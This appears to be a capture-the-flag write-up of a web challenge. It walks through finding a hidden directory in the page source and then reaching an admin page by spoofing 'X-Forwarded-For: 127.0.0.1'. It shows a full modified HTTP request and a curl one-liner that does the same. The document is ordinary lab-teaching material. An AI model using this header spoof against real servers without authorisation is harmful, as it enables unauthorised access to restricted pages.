- all we can find on the main webpage is an image; (that is also a hint, see below)

- checking the page source, we can see the `src` code of the image and a long binary string.

- the trick here is that the content is formatted on a single line ; copy and paste that somewhere. 

- at the end, there's a `HTML comment` that reveals another directory on the webserver.

- alright, we know the drill. this time the hint is `you're not local`. By making a reference to the photo displayed on the first page, this means that the request is not coming from the local address, which is `127.0.0.1`.

- To trick the webserver into thinking that we're making the request from `127.0.0.1`, we have two options I'm aware of :


1. Capture the request in burp suite. It should look like this:

```
GET /admin.php HTTP/1.1
Host: 35.198.135.192:30344
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close
```

- Under the `Host` line, add `X-Forwarded-For: 127.0.0.1`. The final request should look like this

```
GET /admin.php HTTP/1.1
Host: 35.198.135.192:30344
X-Forwarded-For: 127.0.0.1
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close
```

- Then forward the request. You're in, Neo :) 

2. The second method is a bit quicker, and it's just using the same parameter inside the header, but by using `curl`

```
curl -XGET http://<IP:port>/{redacted}.php -H 'X-Forwarded-For: 127.0.0.1'
```

